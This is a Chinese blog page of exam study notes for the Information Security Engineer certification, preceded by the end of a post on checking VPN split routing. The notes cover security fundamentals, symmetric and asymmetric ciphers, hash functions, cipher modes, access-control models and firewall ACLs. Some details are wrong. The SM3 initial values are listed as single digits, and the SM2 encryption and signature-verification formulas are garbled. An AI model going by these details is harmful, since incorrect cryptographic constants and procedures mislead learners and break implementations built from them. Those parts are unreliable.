<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 访问以下网站应显示国内IP</span></span><br><span class="line">百度、淘宝、京东</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>测试国外网站</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 访问以下网站应显示VPN服务器IP</span></span><br><span class="line">Google、YouTube、Twitter</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>使用检测网站</li>
</ol>
<ul>
<li><strong>IP检测</strong>：whatismyipaddress.com</li>
<li><strong>DNS检测</strong>：dnsleaktest.com</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zq-rookie-hacker.github.io/2025/11/08/%E8%BD%AF%E8%80%83(%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88)/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/zhuzhuxia.jpg">
      <meta itemprop="name" content="ZQ-Rooie-Hacker">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZQ-Rookie-Hacker's Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | ZQ-Rookie-Hacker's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/11/08/%E8%BD%AF%E8%80%83(%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88)/" class="post-title-link" itemprop="url">软考(信息安全工程师)</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2025-11-08 12:00:00 / 修改时间：10:30:00" itemprop="dateCreated datePublished" datetime="2025-11-08T12:00:00+08:00">2025-11-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%AF%81%E4%B9%A6/" itemprop="url" rel="index"><span itemprop="name">证书</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>11k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>37 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="一、信息安全基础概念"><a href="#一、信息安全基础概念" class="headerlink" title="一、信息安全基础概念"></a>一、信息安全基础概念</h2><h3 id="1-信息安全基本属性"><a href="#1-信息安全基本属性" class="headerlink" title="1. 信息安全基本属性"></a>1. 信息安全基本属性</h3><ul>
<li><strong>机密性</strong>：确保信息不泄露给未授权的个体、进程或实体</li>
<li><strong>完整性</strong>：保护数据和系统的准确性和完备性，防止未授权篡改</li>
<li><strong>可用性</strong>：确保授权用户在需要时可以正常访问和使用资源</li>
<li><strong>可控性</strong>：对信息传播及内容具有控制能力</li>
<li><strong>抗抵赖性</strong>：确保行为发起者无法否认其行为（如发送消息、签署文件）</li>
</ul>
<h3 id="2-网络信息安全基本功能"><a href="#2-网络信息安全基本功能" class="headerlink" title="2. 网络信息安全基本功能"></a>2. 网络信息安全基本功能</h3><ul>
<li><strong>防御</strong>：事前采取的安全措施（防火墙、加密、访问控制）</li>
<li><strong>检测</strong>：事中或持续性的监控（IDS、态势感知）</li>
<li><strong>应急</strong>：事件发生后的紧急响应措施</li>
<li><strong>恢复</strong>：将受影响系统恢复到正常状态</li>
</ul>
<h3 id="3-信息安全管理流程"><a href="#3-信息安全管理流程" class="headerlink" title="3. 信息安全管理流程"></a>3. 信息安全管理流程</h3><ol>
<li>确定管理对象</li>
<li>评估对象价值</li>
<li>识别对象威胁</li>
<li>识别对象脆弱性</li>
<li>确定对象风险级别</li>
<li>制定防范措施</li>
<li>实施和落实防范措施</li>
<li>运行与维护网络信息安全管理设备</li>
</ol>
<h3 id="4-国家网络安全体系"><a href="#4-国家网络安全体系" class="headerlink" title="4. 国家网络安全体系"></a>4. 国家网络安全体系</h3><ul>
<li><strong>中国网络安全审查技术与认证中心(CCRC)</strong>：负责网络安全设备审查</li>
<li><strong>入网许可证</strong>：由工信部下属实验室（泰尔实验室、威尔实验室）认证</li>
<li><strong>无线产品核准</strong>：由国家无线电管理委员会负责</li>
<li><strong>网络安全等级保护制度</strong>：<ul>
<li>工作流程：定级→备案→建设整改→等级测评→运营维护</li>
<li>等级划分：1-5级（从用户自主保护级到访问验证保护级）</li>
</ul>
</li>
<li><strong>国家计算机网络应急技术处理协调中心(CNCERT&#x2F;CC)</strong>：负责网络安全事件应急处理</li>
<li><strong>四大顶级安全会议</strong>：S&amp;P、CCS、NDSS、USENIX Security</li>
</ul>
<h3 id="5-网络安全组织结构"><a href="#5-网络安全组织结构" class="headerlink" title="5. 网络安全组织结构"></a>5. 网络安全组织结构</h3><h4 id="领导层："><a href="#领导层：" class="headerlink" title="领导层："></a><strong>领导层</strong>：</h4><ul>
<li><strong>职责</strong>：确定网络安全战略方向，分配资源，对网络安全工作负责</li>
<li><strong>组成</strong>：企业高层管理者、网络安全委员会等</li>
<li><strong>关键任务</strong>：<ul>
<li>批准网络安全政策和战略</li>
<li>分配足够的预算和人力资源</li>
<li>监督网络安全工作的执行</li>
<li>对重大网络安全事件做出决策</li>
</ul>
</li>
</ul>
<h4 id="管理层："><a href="#管理层：" class="headerlink" title="管理层："></a><strong>管理层</strong>：</h4><ul>
<li><strong>职责</strong>：制定网络安全策略、标准和流程，负责安全管理团队的组织和管理</li>
<li><strong>组成</strong>：安全总监、安全经理等</li>
<li><strong>关键任务</strong>：<ul>
<li>制定和更新网络安全政策</li>
<li>规划安全投资和资源分配</li>
<li>监督安全实施进度</li>
<li>组织安全培训和意识提升活动</li>
<li>评估安全风险和应对措施</li>
</ul>
</li>
</ul>
<h4 id="执行层："><a href="#执行层：" class="headerlink" title="执行层："></a><strong>执行层</strong>：</h4><ul>
<li><strong>职责</strong>：负责安全策略的具体实施和日常操作</li>
<li><strong>组成</strong>：安全技术实施团队、安全运维团队、安全分析团队等</li>
<li><strong>关键任务</strong>：<ul>
<li>安全设备配置与维护</li>
<li>安全监控与事件响应</li>
<li>漏洞扫描与修复</li>
<li>安全策略实施与验证</li>
<li>安全报告编制</li>
</ul>
</li>
</ul>
<h4 id="外部协作层："><a href="#外部协作层：" class="headerlink" title="外部协作层："></a><strong>外部协作层</strong>：</h4><ul>
<li><strong>职责</strong>：与外部安全组织、合作伙伴、监管机构的协作</li>
<li><strong>组成</strong>：与CNCERT、安全厂商、行业联盟等的协作机制</li>
<li><strong>关键任务</strong>：<ul>
<li>安全信息共享与情报交换</li>
<li>与监管机构的合规对接</li>
<li>参与行业安全标准制定</li>
<li>与合作伙伴的安全协作</li>
<li>安全事件的跨组织响应</li>
</ul>
</li>
</ul>
<h2 id="二、密码学与加密算法"><a href="#二、密码学与加密算法" class="headerlink" title="二、密码学与加密算法"></a>二、密码学与加密算法</h2><h3 id="1-对称加密算法"><a href="#1-对称加密算法" class="headerlink" title="1. 对称加密算法"></a>1. 对称加密算法</h3><h4 id="DES加密算法详细过程"><a href="#DES加密算法详细过程" class="headerlink" title="DES加密算法详细过程"></a>DES加密算法详细过程</h4><p><strong>基本参数</strong>：</p>
<ul>
<li>密钥长度：64位（实际有效56位，8位用于奇偶校验）</li>
<li>分组长度：64位</li>
<li>轮数：16轮</li>
</ul>
<p><strong>加密过程</strong>：</p>
<ol>
<li><strong>初始置换(IP)</strong>：64位明文经过初始置换表重新排列</li>
<li><strong>16轮迭代</strong>：<ul>
<li>每轮将64位数据分为左右32位</li>
<li>右半部分通过扩展置换(48位)→与子密钥异或→S盒压缩(32位)→P盒置换</li>
<li>将S盒输出与左半部分异或，作为下一轮的右半部分</li>
<li>当前右半部分直接作为下一轮的左半部分</li>
<li>每轮使用的子密钥由主密钥经过置换选择1、循环移位和置换选择2生成</li>
</ul>
</li>
<li><strong>逆初始置换(IP⁻¹)</strong>：16轮结束后，左右32位合并，经过逆初始置换得到密文</li>
</ol>
<p><strong>S盒工作原理</strong>：</p>
<ul>
<li>8个S盒，每个S盒接收6位输入，输出4位</li>
<li>6位输入的第1位和第6位组成行号，中间4位组成列号</li>
<li>从S盒中查表得到4位输出</li>
</ul>
<p><strong>密钥生成过程</strong>：</p>
<ol>
<li>64位密钥经过置换选择1，去除8位校验位，得到56位密钥</li>
<li>将56位密钥分为两部分，每部分28位</li>
<li>每轮进行循环左移（移位数根据轮数变化）</li>
<li>经过置换选择2得到48位子密钥</li>
<li>16轮共生成16个不同的48位子密钥</li>
</ol>
<h4 id="AES加密算法详细过程"><a href="#AES加密算法详细过程" class="headerlink" title="AES加密算法详细过程"></a>AES加密算法详细过程</h4><p><strong>基本参数</strong>：</p>
<ul>
<li>密钥长度：128&#x2F;192&#x2F;256位</li>
<li>分组长度：128位</li>
<li>轮数：10&#x2F;12&#x2F;14轮（对应128&#x2F;192&#x2F;256位密钥）</li>
</ul>
<p><strong>加密过程</strong>：</p>
<ol>
<li><strong>初始轮密钥加</strong>：明文与第一轮密钥进行异或</li>
<li><strong>主轮函数</strong>（9&#x2F;11&#x2F;13轮）：<ul>
<li><strong>字节代换(SubBytes)</strong>：使用S盒对每个字节进行非线性替换</li>
<li><strong>行移位(ShiftRows)</strong>：每行按不同偏移量循环移位</li>
<li><strong>列混合(MixColumns)</strong>：对列进行线性变换，实现扩散</li>
<li><strong>轮密钥加(AddRoundKey)</strong>：与当前轮密钥异或</li>
</ul>
</li>
<li><strong>最终轮</strong>：与主轮类似，但省略列混合步骤</li>
</ol>
<p><strong>密钥扩展</strong>：</p>
<ul>
<li>128位密钥扩展为44个32位字(176字节)</li>
<li>扩展规则：W[i] &#x3D; W[i-4] ⊕ T(W[i-1])（当i mod 4 &#x3D; 0时）</li>
<li>T函数包括：字节代换、行移位、与轮常量异或</li>
</ul>
<p><strong>S盒构造</strong>：</p>
<ul>
<li>通过有限域GF(2⁸)上的乘法逆元运算构建</li>
<li>再经过仿射变换得到最终S盒</li>
</ul>
<h4 id="SM4对称加密算法详细过程"><a href="#SM4对称加密算法详细过程" class="headerlink" title="SM4对称加密算法详细过程"></a>SM4对称加密算法详细过程</h4><p><strong>基本参数</strong>：</p>
<ul>
<li>密钥长度：128位</li>
<li>分组长度：128位</li>
<li>轮数：32轮</li>
</ul>
<p><strong>加密过程</strong>：</p>
<ol>
<li><p><strong>密钥扩展</strong>：</p>
<ul>
<li>128位加密密钥经密钥扩展算法生成32轮轮密钥</li>
<li>扩展过程：MK（主密钥）+ FK（固定参数）→ 32轮轮密钥</li>
</ul>
</li>
<li><p><strong>32轮迭代</strong>：</p>
<ul>
<li>将128位明文分为4个32位字(X₀, X₁, X₂, X₃)</li>
<li>每轮计算：Xᵢ₊₄ &#x3D; Xᵢ ⊕ T(Xᵢ₊₁ ⊕ Xᵢ₊₂ ⊕ Xᵢ₊₃ ⊕ RKᵢ)</li>
<li>T变换包括：S盒代换、线性变换</li>
</ul>
</li>
<li><p><strong>反向输出</strong>：32轮后，将最后4个字反向组合成密文</p>
</li>
</ol>
<p><strong>T变换</strong>：</p>
<ul>
<li>非线性部分：S盒代换，由4个8×8的S盒组成</li>
<li>线性部分：L变换，执行8次移位和异或操作</li>
</ul>
<h4 id="RC4流密码详细过程"><a href="#RC4流密码详细过程" class="headerlink" title="RC4流密码详细过程"></a>RC4流密码详细过程</h4><p><strong>初始化</strong>：</p>
<ol>
<li>创建256字节的S盒，并初始化为0-255</li>
<li>使用密钥填充256字节的临时数组T</li>
<li>用密钥对S盒进行初始置换</li>
</ol>
<p><strong>密钥流生成</strong>：</p>
<ol>
<li>i&#x3D;0, j&#x3D;0</li>
<li>i &#x3D; (i + 1) mod 256</li>
<li>j &#x3D; (j + S[i]) mod 256</li>
<li>交换S[i]和S[j]</li>
<li>t &#x3D; (S[i] + S[j]) mod 256</li>
<li>K &#x3D; S[t]，作为密钥流字节</li>
</ol>
<p><strong>加密</strong>：明文字节与密钥流字节进行异或得到密文</p>
<h3 id="2-非对称加密算法"><a href="#2-非对称加密算法" class="headerlink" title="2. 非对称加密算法"></a>2. 非对称加密算法</h3><h4 id="RSA算法详细过程"><a href="#RSA算法详细过程" class="headerlink" title="RSA算法详细过程"></a>RSA算法详细过程</h4><p><strong>密钥生成</strong>：</p>
<ol>
<li>随机选择两个大素数p和q（通常为1024位以上）</li>
<li>计算n &#x3D; p × q</li>
<li>计算欧拉函数φ(n) &#x3D; (p-1)(q-1)</li>
<li>选择整数e（1 &lt; e &lt; φ(n)），使得gcd(e, φ(n)) &#x3D; 1</li>
<li>计算d，使得d × e ≡ 1 (mod φ(n))</li>
<li>公钥：(e, n)，私钥：(d, n)</li>
</ol>
<p><strong>加密过程</strong>：</p>
<ol>
<li>将明文M转换为整数（M &lt; n）</li>
<li>计算密文C &#x3D; Mᵉ mod n</li>
</ol>
<p><strong>解密过程</strong>：</p>
<ol>
<li>计算明文M &#x3D; Cᵈ mod n</li>
</ol>
<p><strong>实际应用中的填充方案</strong>：</p>
<ul>
<li>PKCS#1 v1.5：添加固定格式的填充</li>
<li>OAEP（最优非对称加密填充）：使用随机数和哈希函数进行填充</li>
</ul>
<h4 id="SM2椭圆曲线密码算法详细过程"><a href="#SM2椭圆曲线密码算法详细过程" class="headerlink" title="SM2椭圆曲线密码算法详细过程"></a>SM2椭圆曲线密码算法详细过程</h4><p><strong>基本参数</strong>：</p>
<ul>
<li>素数域p</li>
<li>椭圆曲线方程：y² &#x3D; x³ + ax + b (mod p)</li>
<li>基点G（阶为n的点）</li>
<li>私钥d（1 &lt; d &lt; n-1）</li>
<li>公钥P &#x3D; dG</li>
</ul>
<p><strong>密钥生成</strong>：</p>
<ol>
<li>随机选择私钥d ∈ [1, n-1]</li>
<li>计算公钥P &#x3D; dG</li>
</ol>
<p><strong>加密过程</strong>：</p>
<ol>
<li>选择随机数k ∈ [1, n-1]</li>
<li>计算C₁ &#x3D; kG &#x3D; (x₁, y₁)</li>
<li>计算t &#x3D; kP &#x3D; (x₂, y₂)</li>
<li>计算E &#x3D; h(x₂||y₂) ⊕ M（h为哈希函数）</li>
<li>计算C₂ &#x3D; SM3(x₂||M||y₂)</li>
<li>密文为(C₁, C₂, E)</li>
</ol>
<p><strong>解密过程</strong>：</p>
<ol>
<li>从C₁恢复t &#x3D; dC₁</li>
<li>从E恢复M &#x3D; h(x₂||y₂) ⊕ E</li>
<li>验证C₂ &#x3D; SM3(x₂||M||y₂)</li>
</ol>
<p><strong>签名过程</strong>：</p>
<ol>
<li>计算e &#x3D; SM3(Z || M)，其中Z为用户身份标识</li>
<li>选择随机数k ∈ [1, n-1]</li>
<li>计算(x₁, y₁) &#x3D; kG</li>
<li>计算r &#x3D; (e + x₁) mod n</li>
<li>计算s &#x3D; (1 + d)⁻¹(k - rd) mod n</li>
<li>签名为(r, s)</li>
</ol>
<p><strong>验证过程</strong>：</p>
<ol>
<li>验证r, s ∈ [1, n-1]</li>
<li>计算e &#x3D; SM3(Z || M)</li>
<li>计算R &#x3D; sG + (s + e)P</li>
<li>验证r &#x3D; (e + x_R) mod n</li>
</ol>
<h4 id="ECC（椭圆曲线密码学）基本原理"><a href="#ECC（椭圆曲线密码学）基本原理" class="headerlink" title="ECC（椭圆曲线密码学）基本原理"></a>ECC（椭圆曲线密码学）基本原理</h4><p><strong>椭圆曲线加法</strong>：</p>
<ul>
<li>点加：P + Q &#x3D; R</li>
<li>点倍：2P &#x3D; P + P</li>
<li>无穷远点O作为加法单位元</li>
</ul>
<p><strong>有限域上的椭圆曲线</strong>：</p>
<ul>
<li>素数域：y² &#x3D; x³ + ax + b (mod p)</li>
<li>二进制域：y² + xy &#x3D; x³ + ax² + b (mod 2^m)</li>
</ul>
<p><strong>ECC安全性基础</strong>：</p>
<ul>
<li>椭圆曲线离散对数问题（ECDLP）</li>
<li>给定点P和Q &#x3D; kP，求k在计算上是困难的</li>
</ul>
<h3 id="3-哈希算法"><a href="#3-哈希算法" class="headerlink" title="3. 哈希算法"></a>3. 哈希算法</h3><h4 id="MD5算法详细过程"><a href="#MD5算法详细过程" class="headerlink" title="MD5算法详细过程"></a>MD5算法详细过程</h4><p><strong>基本参数</strong>：</p>
<ul>
<li>输出长度：128位</li>
<li>分组长度：512位</li>
<li>轮数：4轮（每轮16步）</li>
</ul>
<p><strong>处理过程</strong>：</p>
<ol>
<li><strong>填充</strong>：添加1后跟0，使长度≡448 mod 512</li>
<li><strong>添加长度</strong>：附加64位原始消息长度</li>
<li><strong>初始化MD缓冲区</strong>：A&#x3D;0x67452301, B&#x3D;0xEFCDAB89, C&#x3D;0x98BADCFE, D&#x3D;0x10325476</li>
<li><strong>处理512位分组</strong>：<ul>
<li>将分组分为16个32位字</li>
<li>4轮处理，每轮16步</li>
<li>每步使用不同的非线性函数F和常数T</li>
<li>步骤：a &#x3D; b + ((a + F(b,c,d) + X[k] + T[i]) &lt;&lt;&lt; s)</li>
</ul>
</li>
</ol>
<p><strong>非线性函数</strong>：</p>
<ul>
<li>第1轮：F &#x3D; (b &amp; c) | ((~b) &amp; d)</li>
<li>第2轮：F &#x3D; (b &amp; d) | (c &amp; (~d))</li>
<li>第3轮：F &#x3D; b ^ c ^ d</li>
<li>第4轮：F &#x3D; c ^ (b | (~d))</li>
</ul>
<h4 id="SHA-1算法详细过程"><a href="#SHA-1算法详细过程" class="headerlink" title="SHA-1算法详细过程"></a>SHA-1算法详细过程</h4><p><strong>基本参数</strong>：</p>
<ul>
<li>输出长度：160位</li>
<li>分组长度：512位</li>
<li>轮数：80步</li>
</ul>
<p><strong>处理过程</strong>：</p>
<ol>
<li><strong>填充</strong>：添加1后跟0，使长度≡448 mod 512</li>
<li><strong>添加长度</strong>：附加64位原始消息长度</li>
<li><strong>初始化</strong>：h₀&#x3D;0x67452301, h₁&#x3D;0xEFCDAB89, h₂&#x3D;0x98BADCFE, h₃&#x3D;0x10325476, h₄&#x3D;0xC3D2E1F0</li>
<li><strong>处理512位分组</strong>：<ul>
<li>将分组分为16个32位字W₀-W₁₅</li>
<li>扩展为80个字：Wt &#x3D; (Wt-3 ⊕ Wt-8 ⊕ Wt-14 ⊕ Wt-16) &lt;&lt;&lt; 1</li>
<li>80步处理，每步更新五个工作变量a,b,c,d,e</li>
<li>步骤：TEMP &#x3D; (a &lt;&lt;&lt; 5) + f(b,c,d) + e + Wt + Kt</li>
<li>更新：e&#x3D;d, d&#x3D;c, c&#x3D;b&lt;&lt;&lt;30, b&#x3D;a, a&#x3D;TEMP</li>
</ul>
</li>
</ol>
<p><strong>非线性函数与常数</strong>：</p>
<ul>
<li>0-19步：f &#x3D; (b &amp; c) | ((~b) &amp; d), K&#x3D;0x5A827999</li>
<li>20-39步：f &#x3D; b ^ c ^ d, K&#x3D;0x6ED9EBA1</li>
<li>40-59步：f &#x3D; (b &amp; c) | (b &amp; d) | (c &amp; d), K&#x3D;0x8F1BBCDC</li>
<li>60-79步：f &#x3D; b ^ c ^ d, K&#x3D;0xCA62C1D6</li>
</ul>
<h4 id="SM3哈希算法详细过程"><a href="#SM3哈希算法详细过程" class="headerlink" title="SM3哈希算法详细过程"></a>SM3哈希算法详细过程</h4><p><strong>基本参数</strong>：</p>
<ul>
<li>输出长度：256位</li>
<li>分组长度：512位</li>
<li>轮数：64轮</li>
</ul>
<p><strong>处理过程</strong>：</p>
<ol>
<li><strong>填充</strong>：添加1后跟0，使长度≡448 mod 512</li>
<li><strong>添加长度</strong>：附加64位原始消息长度</li>
<li><strong>初始化</strong>：A&#x3D;7, B&#x3D;4, C&#x3D;1, D&#x3D;2, E&#x3D;1, F&#x3D;2, G&#x3D;8, H&#x3D;8（初始向量）</li>
<li><strong>处理512位分组</strong>：<ul>
<li>将分组分为16个32位字</li>
<li>扩展为68个字：Wt &#x3D; P1(Wt-16 ⊕ Wt-9 ⊕ ROTL(Wt-3,15)) ⊕ ROTL(Wt-13,7) ⊕ Wt-6</li>
<li>64轮处理，每轮使用不同的非线性函数和常数</li>
<li>每轮更新8个32位工作变量</li>
</ul>
</li>
</ol>
<p><strong>P0、P1函数</strong>：</p>
<ul>
<li>P0(X) &#x3D; X ⊕ ROTL(X,9) ⊕ ROTL(X,17)</li>
<li>P1(X) &#x3D; X ⊕ ROTL(X,15) ⊕ ROTL(X,23)</li>
</ul>
<h3 id="4-数字签名技术"><a href="#4-数字签名技术" class="headerlink" title="4. 数字签名技术"></a>4. 数字签名技术</h3><p><strong>数字签名过程</strong>：</p>
<ol>
<li>发送方对原始数据用哈希函数（如SM3）生成摘要</li>
<li>用自己的私钥对摘要进行加密，得到数字签名</li>
<li>将原始数据和数字签名一起发送给接收方</li>
<li>接收方用发送方的公钥对签名进行解密，得到摘要A</li>
<li>接收方对收到的原始数据用同样的哈希函数生成摘要B</li>
<li>比较摘要A和摘要B，如果相同，则签名有效</li>
</ol>
<p><strong>典型数字签名算法</strong>：</p>
<ul>
<li>RSA签名：基于RSA加密算法</li>
<li>DSA：仅用于签名，不能加密</li>
<li>ECDSA：基于椭圆曲线的签名算法</li>
<li>SM2：国密算法，包含签名、密钥交换和加密功能</li>
</ul>
<h3 id="5-密码操作模式"><a href="#5-密码操作模式" class="headerlink" title="5. 密码操作模式"></a>5. 密码操作模式</h3><h4 id="ECB-电子密码本-模式"><a href="#ECB-电子密码本-模式" class="headerlink" title="ECB (电子密码本) 模式"></a>ECB (电子密码本) 模式</h4><ul>
<li><strong>工作原理</strong>：将明文分成固定长度的块，每个块独立加密</li>
<li><strong>特点</strong>：<ul>
<li>相同明文块产生相同的密文块</li>
<li>不需要初始化向量(IV)</li>
<li>容易受到模式分析攻击</li>
</ul>
</li>
<li><strong>应用场景</strong>：适合加密短消息或密钥，不适合加密大量数据</li>
<li><strong>安全风险</strong>：明文模式在密文中可见</li>
</ul>
<h4 id="CBC-密码分组链接-模式"><a href="#CBC-密码分组链接-模式" class="headerlink" title="CBC (密码分组链接) 模式"></a>CBC (密码分组链接) 模式</h4><ul>
<li><strong>工作原理</strong>：每个明文块与前一个密文块进行异或后再加密</li>
<li><strong>特点</strong>：<ul>
<li>相同明文块在不同位置产生不同密文块</li>
<li>需要初始化向量(IV)</li>
<li>错误传播：单个比特错误影响当前块和下一个块</li>
</ul>
</li>
<li><strong>应用场景</strong>：广泛用于文件加密、SSL&#x2F;TLS</li>
<li><strong>安全优势</strong>：隐藏明文模式</li>
</ul>
<h4 id="CFB-密文反馈-模式"><a href="#CFB-密文反馈-模式" class="headerlink" title="CFB (密文反馈) 模式"></a>CFB (密文反馈) 模式</h4><ul>
<li><strong>工作原理</strong>：将前一个密文块加密后与明文异或得到当前密文</li>
<li><strong>特点</strong>：<ul>
<li>可以处理流数据</li>
<li>需要初始化向量(IV)</li>
<li>错误传播：单个比特错误影响多个后续块</li>
</ul>
</li>
<li><strong>应用场景</strong>：实时数据加密，如卫星通信</li>
<li><strong>优势</strong>：可以将块加密算法转换为流加密</li>
</ul>
<h4 id="OFB-输出反馈-模式"><a href="#OFB-输出反馈-模式" class="headerlink" title="OFB (输出反馈) 模式"></a>OFB (输出反馈) 模式</h4><ul>
<li><strong>工作原理</strong>：生成一个密钥流，明文与密钥流异或得到密文</li>
<li><strong>特点</strong>：<ul>
<li>不受密文传输错误影响</li>
<li>需要初始化向量(IV)</li>
<li>相同IV和密钥会产生相同密钥流</li>
</ul>
</li>
<li><strong>应用场景</strong>：卫星通信、有噪信道</li>
<li><strong>优势</strong>：错误不会传播</li>
</ul>
<h4 id="CTR-计数器-模式"><a href="#CTR-计数器-模式" class="headerlink" title="CTR (计数器) 模式"></a>CTR (计数器) 模式</h4><ul>
<li><strong>工作原理</strong>：使用计数器生成密钥流，明文与密钥流异或</li>
<li><strong>特点</strong>：<ul>
<li>可并行处理</li>
<li>不受传输错误影响</li>
<li>需要唯一计数器值</li>
</ul>
</li>
<li><strong>应用场景</strong>：高性能要求的加密，如硬盘加密</li>
<li><strong>优势</strong>：高效，可随机访问</li>
</ul>
<h2 id="三、网络安全技术"><a href="#三、网络安全技术" class="headerlink" title="三、网络安全技术"></a>三、网络安全技术</h2><h3 id="1-网络安全体系"><a href="#1-网络安全体系" class="headerlink" title="1. 网络安全体系"></a>1. 网络安全体系</h3><p><strong>网络安全体系特征</strong>：</p>
<ul>
<li><strong>整体性</strong>：各安全组件协同工作</li>
<li><strong>协同性</strong>：不同安全措施相互配合</li>
<li><strong>过程性</strong>：安全管理是持续过程</li>
<li><strong>全面性</strong>：覆盖所有安全方面</li>
<li><strong>适应性</strong>：能够应对新的安全威胁</li>
</ul>
<h3 id="2-访问控制模型"><a href="#2-访问控制模型" class="headerlink" title="2. 访问控制模型"></a>2. 访问控制模型</h3><h4 id="自主访问控制模型-DAC"><a href="#自主访问控制模型-DAC" class="headerlink" title="自主访问控制模型(DAC)"></a>自主访问控制模型(DAC)</h4><ul>
<li><strong>特点</strong>：基于主体的访问控制</li>
<li><strong>实现方式</strong>：<ul>
<li>基于行：能力表、前缀表</li>
<li>基于列：访问控制列表(ACL)、保护位</li>
</ul>
</li>
<li><strong>特点</strong>：灵活性高，但难以统一管理</li>
</ul>
<h4 id="强制访问控制模型-MAC"><a href="#强制访问控制模型-MAC" class="headerlink" title="强制访问控制模型(MAC)"></a>强制访问控制模型(MAC)</h4><ul>
<li><strong>特点</strong>：基于安全标记的访问控制</li>
<li><strong>典型模型</strong>：<ul>
<li>BLP模型：保护信息机密性，”不上读，不下写”</li>
<li>Biba模型：保护信息完整性，”不下读，不上写”</li>
</ul>
</li>
<li><strong>实现方式</strong>：安全标签、访问矩阵</li>
</ul>
<h4 id="基于角色的访问控制模型-RBAC"><a href="#基于角色的访问控制模型-RBAC" class="headerlink" title="基于角色的访问控制模型(RBAC)"></a>基于角色的访问控制模型(RBAC)</h4><ul>
<li><strong>特点</strong>：通过角色关联权限和用户</li>
<li><strong>核心组件</strong>：<ul>
<li>用户：系统中的实体</li>
<li>角色：权限的集合</li>
<li>权限：对客体的操作权</li>
</ul>
</li>
<li><strong>优点</strong>：简化权限管理，支持最小特权原则</li>
<li><strong>特殊属性</strong>：同时具有强制访问控制和自主访问控制的属性，是当前最常用的访问控制模型</li>
</ul>
<h3 id="3-防火墙技术"><a href="#3-防火墙技术" class="headerlink" title="3. 防火墙技术"></a>3. 防火墙技术</h3><h4 id="防火墙类型"><a href="#防火墙类型" class="headerlink" title="防火墙类型"></a>防火墙类型</h4><ol>
<li><strong>包过滤路由器</strong>：基于IP&#x2F;TCP&#x2F;UDP头信息过滤</li>
<li><strong>双宿主机</strong>：具有两个网络接口的堡垒主机</li>
<li><strong>屏蔽主机</strong>：包过滤路由器+堡垒主机</li>
<li><strong>屏蔽子网</strong>：两个路由器+DMZ区域</li>
</ol>
<h4 id="防火墙性能指标"><a href="#防火墙性能指标" class="headerlink" title="防火墙性能指标"></a>防火墙性能指标</h4><ul>
<li>单位时间内建立的TCP连接数量</li>
<li>每秒处理的数据包数量</li>
<li>并发连接数</li>
<li>吞吐量</li>
</ul>
<h4 id="DMZ结构"><a href="#DMZ结构" class="headerlink" title="DMZ结构"></a>DMZ结构</h4><ul>
<li><strong>隔离区(DMZ)</strong>：放置对外服务的服务器</li>
<li><strong>内部网络</strong>：保护内部资源</li>
<li><strong>外部网络</strong>：互联网</li>
<li><strong>两层防火墙</strong>：外部防火墙过滤入站流量，内部防火墙过滤DMZ到内部网络流量</li>
</ul>
<h4 id="华为防火墙设置指令"><a href="#华为防火墙设置指令" class="headerlink" title="华为防火墙设置指令"></a>华为防火墙设置指令</h4><ul>
<li><p><strong>基本ACL</strong>：基于源IP地址进行过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">acl number 2000</span><br><span class="line"> rule 5 permit source 192.168.1.0 0.0.0.255</span><br><span class="line"> rule 10 deny source any</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>高级ACL</strong>：基于源&#x2F;目的IP、协议、端口等多条件过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">acl number 3000</span><br><span class="line"> rule 5 permit tcp source 192.168.1.0 0.0.0.255 destination 10.0.0.2 0 destination-port eq www</span><br><span class="line"> rule 10 deny ip source any destination any</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="4-隧道协议技术"><a href="#4-隧道协议技术" class="headerlink" title="4. 隧道协议技术"></a>4. 隧道协议技术</h3><h4 id="二层隧道协议"><a href="#二层隧道协议" class="headerlink" title="二层隧道协议"></a>二层隧道协议</h4><ul>
<li><strong>PPTP</strong>：早期远程拨号接入，存在安全漏洞</li>
